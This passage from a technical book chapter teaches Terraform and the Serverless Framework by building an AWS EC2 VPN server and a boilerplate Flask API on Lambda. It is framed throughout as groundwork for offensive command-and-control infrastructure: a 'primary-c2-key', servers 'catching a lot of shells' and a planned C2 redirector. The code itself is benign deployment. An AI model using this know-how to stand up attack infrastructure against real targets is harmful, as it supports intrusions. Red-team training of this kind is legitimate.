Setting the first attribute, most_recent, to true tells the service that you always want the latest version of any image you pull. The second attribute, owners, specifies that you’re trying to locate images in the AWS Marketplace. You can browse the AWS Marketplace and subscribe to any images you want or even make your own.

You could also provide a more specific owners parameter than aws-marketplace to return only AMIs owned by a specific account. If you wanted to specify that the Ubuntu AMI you’re requesting should be built by Canonical (the maker of Ubuntu), for example, you would replace the Marketplace value with its ID, which is located in the AMI listing. Or, if you want to pull an AMI you created, you could specify your own ID here.

Next, you define filters to apply to your Marketplace queries. The filter for the name of the image is a fairly verbose path string that tells the service you want an HVM-compatible 64-bit Ubuntu 18.04 AMI. HVM stands for hardware virtual machine, and hvm is the value you set for the virtualization-type filter.

This configuration is what you’ll use the majority of the time for a simple EC2 instance. If you need something different, you should already have a rough idea of what that filter would be.

Terraform Network Access Control Lists
The next set of instructions relates to network security rules. In traditional infrastructure, these are known as network access control lists (ACLs):

# Put your IP here to whitelist it for SSH.

variable "access_addr" {
  type    = string
  default = "0.0.0.0/0"
}

resource "aws_security_group" "vpn_group" {
  name        = "vpn_group"
  description = "Allow ports for VPN and SSH access"

  # Open the default OpenVPN port.
  ingress {
    from_port   = 1194
    to_port     = 1194
    protocol    = "udp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  # SSH for remote access, and you might want to lock down to your IP prior to rollout.
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = [var.access_addr]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}
You start by defining a variable called access_addr, which works just like a variable in any programming language; you can reuse it throughout your script to avoid statically creating multiple values. The access_addr variable is a source IP address or range of addresses that you can use to restrict access to your server. If you want your system to be accessible only to hosts on a network you fully control, you could specify the public IP address of those hosts. The 0.0.0.0/0 classless inter-domain routing (CIDR) notation means the server is wide open to any IP address, but you can edit the variable later as needed.

The next definition to configure is the aws_security_group resource group. You name this group vpn_group because this sample code is a template for spinning up a VPN using Terraform, and you’ll use it more in later chapters. This security group is your network ACL.

You define two ingress rules next. The first rule, set to port 1194 over the User Datagram Protocol (UDP), is for the default OpenVPN port that you want to expose via an OpenVPN service in the future. The second rule, set to port 22 over TCP, is for SSH, which is how you’ll access and administrate your server after automation is complete. This is a good use case for the access_addr variable, as you could restrict SSH access to only known IP addresses to secure your system further.

An egress rule allows your server to make outbound connections to other hosts on a given network or allow access to the internet. In this case, you want your server to be able to reach out to anywhere it needs to go, so you set it to 0.0.0.0/0. However, if you wanted to harden the security of your infrastructure in general, setting egress rules is a great, simple way to do so. You can create as many egress rules as you’d like to allow traffic only to certain websites, hosts, and ports. You could even block outbound internet traffic entirely.

Terraform EC2 Instance Creation
Finally, you can create your EC2 instance (you had to define the other data sources and resources first because your EC2 instance depends on the values they return):

resource "aws_instance" "primary_vpn" {
  ami             = data.aws_ami.ubuntu.id
  instance_type   = "t2.micro"
  security_groups = [aws_security_group.vpn_group.name]
  key_name        = "primary-c2-key"


  tags = {
    Name = "Primary vpn"
  }
}

output "IP" {
  value = aws_instance.primary_vpn.public_ip
}
This resource, an aws_instance called primary_vpn, will take in the AMI identifier that you get from your data source. You could directly copy an ID here if you know exactly what it is, but doing so might lock you in to a specific region or configuration depending on where your AMI exists. This approach keeps it a little more dynamic.

The instance_type is the hardware configuration. Amazon provides many configurations. If you’re operating on the free tier, stick with t2.micro, which is a simple single-core instance with 1GB of RAM at the time of writing. That may not sound like much, but for our purposes it’s plenty and will run much faster than you might think, since the AWS hardware is purpose-built for virtualization. In a real-world scenario (especially for C2 infrastructure where you’re catching a lot of shells), you might want to upgrade your server to a medium or larger instance, however. AWS has a lot of hardware options that use service-specific terminology, so be sure to check its documentation to make an informed decision (https://aws.amazon.com/ec2/instance-types/).

After specifying your hardware information, you provide the security group you created earlier, which defines the network ACL, and then the SSH key that you generated earlier in the AWS Management Console. You finish by defining an output statement that will print your server’s IP address so that you can SSH into it.

Listing 4-1 shows the complete code for the Terraform VPN server.

# Configure the AWS provider.
provider "aws" {
  region = "us-east-2"
}

data "aws_ami" "ubuntu" {
  most_recent = "true"
  owners      = ["aws-marketplace"]

  filter {
    name   = "name"
    values = ["ubuntu/images/hvm-ssd/ubuntu-jammy-22.04-amd64-server-*"]
  }

  filter {
    name   = "virtualization-type"
    values = ["hvm"]
  }
}

# Put your IP here to whitelist it for SSH.

variable "access_addr" {
  type    = string
  default = "0.0.0.0/0"
}

resource "aws_security_group" "vpn_group" {
  name        = "vpn_group"
  description = "Allow ports for VPN and SSH access"

# Open the default OpenVPN port.
  ingress {
    from_port   = 1194
    to_port     = 1194
    protocol    = "udp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  # SSH for remote access, and you might want to lock down to your IP prior to rollout.
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = [var.access_addr]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

resource "aws_instance" "primary_vpn" {
  ami             = data.aws_ami.ubuntu.id
  instance_type   = "t2.micro"
  security_groups = [aws_security_group.vpn_group.name]
  key_name        = "primary-c2-key"


  tags = {
    Name = "Primary vpn"
  }
}

output "IP" {
  value = aws_instance.primary_vpn.public_ip
}
Listing 4-1: The complete Terraform VPN server code

Terraform Deployment
Let’s see what all this looks like in action. (Obviously, you won’t be able to run these commands successfully just yet; the goal for now is to familiarize yourself with Terraform.) To start a new Terraform project, run the following command:

$ terraform init
The terraform init command initializes Terraform for use with the specified provider (in this case, AWS). Once it is initialized, Terraform will know the credentials to use to authenticate to the provider’s API and import the libraries needed to translate references to your AWS-specific data sources and resources. The output should look similar to the following:

Initializing the backend...

Initializing provider plugins...
    Checking for available provider plugins...
    Downloading plugin for provider "aws" (hashipcorp/aws) 2.61.0...

The following providers do not have any version constraints in configuration,
so the latest version was installed.

To prevent automatic upgrades to new major versions that may contain breaking
changes, it is recommended to add version = "..." constraints to the
corresponding provider blocks in configuration, with the constraint strings
suggested below.

* provider.aws: version = "~> 2.61"

Terraform has been successfully initialized!

You may now begin working with Terraform. Try running "terraform plan" to see
any changes that are required for your infrastructure. All Terraform commands
should now work.

If you ever set or change modules or backend configuration for Terraform,
rerun this command to reinitialize your working directory. If you forget, other
commands will detect it and remind you to do so if necessary.
Since Terraform understands your IaC as a true configuration, it can give you an idea of what to expect before you ever even execute the script. In other words, Terraform’s understanding of desired state allows it to test your IaC and propose changes that you can then choose to apply or review further. By running the following check, you can catch any errors before you attempt to run the code itself:

$ terraform plan
Refreshing Terraform state in-memory prior to plan...
The refreshed state will be used to calculate this plan, but will not be
persisted to local or remote state storage.

data.aws_ami.ubuntu: Refreshing state...
============================================================
After running terraform plan, you’ll be presented with Terraform’s execution plan. Some of the static changes, like the SSH key in use, the instance type, and the network rules, are displayed clearly for you to verify. Other data, like dynamically generated identifiers, IP addresses, and other inferred data sources and resources, will be marked as successful by a plus sign (+) with a (known after apply) placeholder for their values, as shown in this sample output snippet:

...
+ prefix_list_ids = []
+ protocol        = "tcp"
+ security_groups = []
+ self            = false
+ to_port         = 22
  },

+ name                  = "vpn_group"
+ owner_id              = (known after apply)
+ revoke_rules_on_delete = false
+ vpc_id                = (known after apply)

Plan: 2 to add, 0 to change, 0 to destroy.

--------------------------------------------------

Note: You didn't specify an "-out" parameter to save this plan, so Terraform
can't guarantee that exactly these actions will be performed if
"terraform apply" is subsequently run.
In the event of an error, Terraform will give you the line number and resource name that caused it. Terraform will mark anything it plans to remove as part of a change with a minus sign (-).

At this point, the code looks good according to Terraform’s plan, so run the following command to have Terraform execute it and stand up the server:

$ terraform apply
data.aws_ami.ubuntu: Refreshing state...
After running terraform apply, you should see the same terraform plan output from earlier so you can double-check your configuration one last time. Terraform will then prompt you to approve the changes before it begins execution. If everything looks good, enter yes, and the automation will begin. Once the script is complete, Terraform will print a summary of all the changes as well as the IP address output you specified.

Tearing down this infrastructure when you’re done with it is just as easy:

$ terraform destroy
data.aws_ami.ubuntu: Refreshing state...
aws_security_group.vpn_group: Refreshing state...
[id=sg-06bcc68a713b88760]
aws_instance.primary_vpn: Refreshing state... [id=i-051e00673c0d14d4]
The terraform destroy command is the inverse of terraform apply. It will print a summary of everything to be deleted based on the state and then prompt you for approval. Once you type yes and it completes the deletion, Terraform prints another summary to confirm that your server and resources have, in fact, been destroyed.

You might be wondering how Terraform knows the current state. After a successful apply operation, Terraform automatically stores the state in a hidden file called terraform.tfstate that lives in the directory where you initialized your Terraform script (this can be any directory you choose, so pay attention to where you run terraform init). If you lose or delete this file before you destroy your infrastructure, Terraform won’t know how to run a destroy or apply command for you anymore, and you’ll run into resource-naming collisions until you manually delete them from the console. This is why it’s so important to keep track of the .tfstate file. In a production setting, many infrastructure engineers prefer to store it in their build pipeline for their infrastructure so that it is always on a remote server being tracked, version controlled, and hosted.

If you prefer a less manual approach, Terraform also offers HCP Terraform (https://developer.hashicorp.com/terraform/cloud-docs), formerly known as Terraform Cloud, which has state management built in. For your proof-of-concept IaC projects going forward, these safeguards aren’t particularly necessary, but they’re crucial in a real-world deployment.

A Serverless Framework Primer
AWS Lambda is a serverless compute service that hosts the runtimes for programming languages like Python and Node.js, or you can even bring your own runtime for unofficially supported languages. That means that instead of needing to set up an entire server to host simple API endpoints for a web application, you can use AWS Lambda to host your endpoints for you. AWS Lambda is also useful for automation and cross-service communication within AWS itself. You can do quite a lot with it that isn’t application specific.

The Serverless Framework is the first framework developed for building applications with services such as AWS Lambda, and just like Terraform, it allows you to automate your infrastructure configuration—in this case, to support a serverless application. So, instead of standing up a full Apache server with a Python runtime, for example, you just use AWS Lambda, skipping the whole server configuration and dependency setup, to get a simple web application running in seconds. Otherwise, you’d have to go through a tedious process that would require you to understand the minutiae of routing with AWS, storing code in S3 buckets, and configuring Lambda functions manually.

Unlike Terraform, however, the Serverless Framework is not really made for IaC alone. Although it can and does do a lot of infrastructure automation, it is built for application development on services like AWS Lambda. Serverless supports multiple cloud providers, so you can write the same IaC automation and application code in Serverless and deploy it to any supported cloud provider to run your code the same way.

NOTE
AWS does provide an IaC service known as CloudFormation, but if you use that, you’ll be restricted to using the AWS platform, which may not be best for your use case. The Serverless Framework gives you more flexibility by generating platform-native code for any cloud provider you choose. Of course, since you’re using AWS in these examples, Serverless will generate CloudFormation code.

Since you’re using AWS to run all this code, you’ll need to configure an account within your Serverless Framework authentication configuration. I’ll walk you through that setup shortly, but first you’ll get acquainted with the Serverless Framework just as you did with Terraform.

Boilerplate Serverless Application
Once you have Serverless installed, create a basic boilerplate Python Flask API project as follows:

$ serverless
The Serverless Framework provides templates for working with various cloud providers. Select the AWS/Python/Flask API template, as shown in Figure 4-6.

Terminal output after running the serverless command, displaying template options with “AWS/Python/Flask API” selected.
Figure 4-6: Selecting the AWS/Python/Flask API template

Serverless will prompt you for a project name, which will become the name of the folder that Serverless generates to store the preconfigured code. You’ll be using this template later to build a C2 redirector, so enter that as the name:

Name Your Project: redirector
Next, you’ll be asked whether you want to create or select an existing application. Choose Create a New App. When prompted to name the new application, enter the following:

Name Your New App: flask-redirector
The application name functions as a namespace that can contain multiple services. For example, you could run various C2 endpoint redirectors as separate projects, each contained and managed under the flask-redirector application. This can come in handy for scaling out operations, but for now you’ll stick with a single service since the immediate goal is simply to get a functioning serverless endpoint up and running.

Once you’ve created your project, you should see the message shown in Figure 4-7.

Terminal output with message “Your new Service redirector is ready” and next steps including directory change, dependency installation, and deployment commands.
Figure 4-7: Next steps for the Flask API project

Your project directory, redirector, will automatically be populated with all the files you need to get started. View them as follows:

$ ls redirector
app.py    package.json    README.md    requirements.txt   serverless.yml
Serverless Python Deployment Dependencies
Despite their helpful intent, the instructions for next steps shown in Figure 4-7 are not comprehensive enough for you to finish setting up the Flask API for deployment. For starters, you need to create a Python virtual environment to contain dependencies for your application so you can avoid having to install the necessary libraries systemwide:

$ cd redirector
$ python3.12 -m venv redirector-env
$ source redirector-env/bin/activate
Then you need to install the following two dependencies:

(redirector-env)$ sls plugin install -n serverless-wsgi
(redirector-env)$ pip3.12 install -r requirements.txt
The serverless-wsgi plug-in handles the Web Server Gateway Interface (WSGI) that will help serve the Flask application, and the pip installer is setting up the Flask and urllib3 libraries via the requirements.txt file.

Now we’ll walk through the pregenerated project files, starting with the serverless.yml file, which contains your IaC configuration for the Serverless application:

# "org" ensures this service is used with the correct Serverless Framework Access Key.
org: YOURORGHERE
# "app" enables Serverless Framework Dashboard features and sharing them with other Services.
app: flask-redirector
# "service" is the name of this project. This will also be added to your AWS resource names.
service: redirector

custom:
  wsgi:
    app: app.app

provider:
  name: aws
  runtime: python3.12

functions:
  api:
    handler: wsgi_handler.handler
    events:
      - http:
          path: /
          method: ANY
      - http:
          path: /{proxy+}
          method: ANY

plugins:
  - serverless-wsgi
  - serverless-python-requirements
The only setting that will differ for you is the org value, which will match the organization value that you created when setting up your Serverless account. Serverless will automatically populate this field when you sign in.

The provider value is fairly straightforward, since you’re using AWS and the Python runtime. This tells the Serverless Framework to run the appropriate CloudFormation code to set up your Lambda functions with this runtime in AWS. If you needed to use an older or newer Python runtime for some reason, you would modify this value accordingly. As long as AWS supports the version you want to use, you’re free to upgrade or downgrade as needed based on your development dependencies.

The functions section of this configuration describes the handler and the endpoints for events that will trigger a response from the API. The handler field is a direct reference to the WSGI library you’re using to serve Flask. The events field allows you to customize the type of requests that can be received by a specific route. By default, the configuration allows any HTTP method on any path. In later chapters, this is exactly what you’ll want to implement, a C2 redirector, but if you wanted to restrict your API, this is where you would do so.

Serverless Flask API Code
The Serverless Framework provides this very helpful Python code to get you started so that you can see this all running in real time right away:

from flask import Flask, jsonify, make_response

app = Flask(__name__)

@app.route("/")
def hello_from_root():
    return jsonify(message='Hello from root!')

@app.route("/hello")
def hello():
    return jsonify(message='Hello from path!')

@app.errorhandler(404)
def resource_not_found(e):
    return make_response(jsonify(error='Not found!'), 404)
The template code implements three distinct routes that return static content. The first is the root route, /, which implements a function that returns the string Hello from root!. The hello route implements a function that returns the string Hello from path!. Finally, the app has a built-in error-handler route to handle any 404 responses in the event that the client requests a nonexistent route. This handler function returns a standard 404 Not Found response.

The remaining files in the project structure include those related to the dependencies and a boilerplate README.md file.

With your project in place and your dependencies installed, the application is ready for deployment.

Serverless Framework Deployment
To deploy the application, run the following:

$ sls deploy
Deploying "redirector" to stage "dev" (us-east-1)

Using Python specified in "runtime": python3.12

Packaging Python WSGI handler...
Creating AWS CloudFormation stack...
If you run sls deploy with the --verbose flag, you can see how the Serverless Framework translates your code into CloudFormation and then configures your infrastructure to run your application code. At the end, you should see the RESTful API endpoints that were deployed to serve responses from your Flask API, as shown in the following sample output:

When you use curl to send a GET request to them, you should see the following output:

{"message":"Hello from root! "}

To remove your application from its deployed state, execute the sls remove command. This will tear down all the configurations supporting your application and delete the application functions. From there, you can make modifications and redeploy as you see fit.

Summary
Terraform and the Serverless Framework are the two primary DevOps-related tools you’ll use for your infrastructure automation throughout the upcoming chapters. You can find out more about the Serverless Framework in its documentation (https://www.serverless.com/framework/docs), but this introduction should help you understand what’s going on as you begin to customize and run these tools.

Since you can now deploy servers and services to the cloud via automation, you’re probably going to want to run some sort of software on them to support an operation. The most common thing an attacker needs when deploying infrastructure is a C2 server. In the next chapter, you’ll learn about the network communication flows that C2 servers utilize, so you can prepare to configure one using tools like Terraform and the Serverless Framework.

5 APPLYING NETWORK FUNDAMENTALS TO C2 IMPLEMENTATION
